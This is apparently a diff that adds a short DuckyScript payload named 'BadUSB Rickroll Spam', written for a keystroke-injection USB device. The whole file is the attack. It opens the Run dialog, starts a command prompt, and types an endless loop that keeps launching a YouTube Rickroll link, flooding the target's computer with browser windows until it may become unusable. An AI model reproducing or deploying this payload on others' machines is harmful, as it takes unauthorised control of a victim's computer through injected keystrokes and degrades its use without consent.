@@ -1,0 +1,13 @@
+REM BadUSB Rickroll Spam
+DELAY 1000
+GUI r
+DELAY 200
+STRING cmd /k
+ENTER
+DELAY 1
+STRING :start
+ENTER
+STRING start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+ENTER
+STRING goto start
+ENTER
